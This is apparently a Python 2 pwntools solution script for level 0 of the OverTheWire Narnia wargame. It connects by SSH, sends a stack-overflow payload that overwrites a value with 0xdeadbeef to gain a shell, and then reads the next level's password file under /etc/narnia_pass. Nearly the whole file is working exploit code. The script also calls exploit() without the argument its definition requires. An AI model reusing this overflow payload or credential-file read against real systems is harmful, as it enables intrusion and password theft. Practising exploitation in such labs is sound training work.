#!/usr/bin/python2
# simple stack smash. clobber the register holding the value with another value to win.
def exploit(level0password):
    from pwn import *
    import re
    ssh = ssh('narnia0', 'narnia.labs.overthewire.org', password='narnia0', port=2226)
    shell = ssh.run('sh')
    pwn = """(perl -e 'print "A"x20;print "\xef\xbe\xad\xde"';cat)|/narnia/narnia0"""
    shell.sendline(pwn)
    shell.sendline("cat /etc/narnia_pass/narnia1\n")
    buf = ""
    print "{+} Hunting fleg/readin response pls wait might take 1 minute..."
    for x in range(0, 10):
        buf += shell.recvline(timeout=5)
    #print buf
    # efeidiedae
    regex = re.findall('[a-z]{10}', buf)
    if len(regex):
        return regex[0]
#shell.interactive()

if __name__ == "__main__":
    level1pass = exploit()
    if level1pass != None:
        print "{$$} Level 1 Password is: %s" %(level1pass)
